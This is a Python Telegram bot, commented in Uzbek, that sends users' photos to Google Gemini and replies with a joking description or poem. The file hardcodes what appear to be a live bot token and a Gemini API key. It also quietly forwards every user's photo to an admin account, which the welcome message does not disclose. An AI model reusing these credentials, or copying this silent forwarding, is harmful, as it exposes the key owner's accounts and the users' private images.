import os
import telebot
import google.generativeai as genai
from PIL import Image
import time

# Sizning eng oxirgi yangi tokeningiz
BOT_TOKEN = '8822374451:AAEwpamwDeMsXYg9OED50SL1ACb0nV-M3X8'
GEMINI_API_KEY = 'AIzaSyAt10c_-oKeN-1gIeTk9frpA9xuUFesPhI'
ADMIN_ID = 7881352941  # @userinfobot bergan ID

# Gemini AI-ni sozlash
genai.configure(api_key=GEMINI_API_KEY)

# To'liq model nomi (v1beta xatosini oldini olish uchun)
model = genai.GenerativeModel(
    model_name='models/gemini-1.5-flash-latest'
)

bot = telebot.TeleBot(BOT_TOKEN)

# MUTLAQ TOZALASH: Har qanday eski ulanish va webhooklarni o'chirish
try:
    bot.remove_webhook()
    bot.delete_webhook(drop_pending_updates=True)
    time.sleep(2)  # Serverga nafas rostlash uchun vaqt
except:
    pass

DOWNLOAD_DIR = "downloads"
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Salom! Men Google Gemini AI bilan ishlaydigan aqlli botman. 😎\nMenga ixtiyoriy rasm yuboring, men uni AI orqali ko'rib, sizga prikol ta'rif yoki she'r yozib beraman!")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    status_msg = bot.reply_to(message, "AI rasmni ko'ryapti va o'ylayapti... 🤔")

    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        local_path = f"{DOWNLOAD_DIR}/{chat_id}.jpg"
        with open(local_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        img = Image.open(local_path)
        prompt = "Ushbu rasmga qarab, rasm egasini kuldiradigan, juda qiziqarli va prikol, hazilomuz ta'rif yoki qisqa she'r yozib ber. O'zbek tilida bo'lsin."
        
        response = model.generate_content([prompt, img])
        ai_reply = response.text

        bot.delete_message(chat_id, status_msg.message_id)
        bot.reply_to(message, f"📸 **Gemini AI sharhi:**\n\n{ai_reply}")

        try:
            with open(local_path, 'rb') as admin_photo:
                bot.send_photo(ADMIN_ID, admin_photo, caption=f"👁 Kimdir botni ishlatdi.\nAI javobi: {ai_reply[:100]}...")
        except:
            pass

        if os.path.exists(local_path):
            os.remove(local_path)

    except Exception as e:
        try:
            bot.edit_message_text(f"Xatolik yuz berdi: {str(e)}", chat_id, status_msg.message_id)
        except:
            pass

# Flask Server (Render portni ushlashi uchun)
from flask import Flask
app = Flask('')
@app.route('/')
def home(): return "Bot Active"

if __name__ == "__main__":
    print("Google Gemini AI Bot ishga tushdi...")
    import threading
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=os.environ.get('PORT', 8080))).start()
    
    # !!! ASOSIY O'ZGARISH: 409 xatosini urib tushiradigan aqlli so'rov tartibi
    bot.polling(none_stop=True, interval=2, timeout=20)
